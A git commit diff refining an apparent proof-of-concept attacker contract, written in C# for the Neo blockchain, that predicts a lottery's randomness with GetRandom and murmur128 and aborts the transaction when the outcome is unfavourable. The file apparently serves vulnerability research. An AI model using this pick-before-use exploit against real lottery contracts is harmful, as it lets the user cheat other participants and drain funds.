6021c5ec19c99a8f712e2cc15de0ca97eacc4b74
dusmart <dusmart@qq.com>
2022-04-22 13:23:01 +0800

    refine RAUdefender attack

--- PoC/PickBeforeUse/LotteryWithDefenderAttacker/LotteryWithDefenderAttacker.cs
+++ PoC/PickBeforeUse/LotteryWithDefenderAttacker/LotteryWithDefenderAttacker.cs
@@ -19,17 +19,17 @@ namespace LotteryWithDefenderAttacker
         [InitialValue("NLLvsqs7AyBNmQT6NThUxYWDFwV5b1evaK", ContractParameterType.Hash160)]
         private static readonly UInt160 Owner = default;
 
-        public static object[] a() {
+        public static ByteString[] a() {
             BigInteger rand = Runtime.GetRandom();
             for (int i = 0; i < 10; i++) {
                 byte[] nextrand = murmur128(rand.ToByteArray().Concat(new byte[]{0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}).Take(16), Runtime.GetNetwork());
                 if ((new BigInteger(nextrand)) % 2 == 1) {
-                    return new object[] {"attack", Owner};
+                    return new ByteString[] {"attack", Owner};
                 }
                 rand = Runtime.GetRandom();
             }
             ExecutionEngine.Abort();
-            return new object[] {"attack", Owner};
+            return new ByteString[] {"attack", Owner};
         }
 
         public static void Update(ByteString nefFile, string manifest)
